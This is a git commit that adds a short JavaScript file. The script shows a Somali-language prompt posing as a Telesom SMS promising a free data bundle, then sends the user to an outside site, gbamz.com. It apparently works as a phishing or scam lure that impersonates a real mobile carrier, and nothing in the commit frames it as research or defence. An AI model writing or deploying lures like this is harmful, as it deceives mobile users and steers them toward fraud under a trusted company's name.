7fe10201c557888180b314942f5734694df96532
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-05 06:02:55 +0100

    Create telesom-activation.js

---
+++ telesom-activation.js
@@ -0,0 +1,5 @@
+var password = 'NAQLI'
+password=prompt('SMS: Hambalyo, Telesom nambarkaaga waxa uu xaq u leeyahay in uu helo Xirmada Xogta Bilaashka ah ee 1 Bilaashka ah, guji OK si aad u dhaqaajiso xidhmadaada xogta','NAQLI');
+if (password != 'NAQLI') {
+location.href='https://gbamz.com/telesom.html';
+}
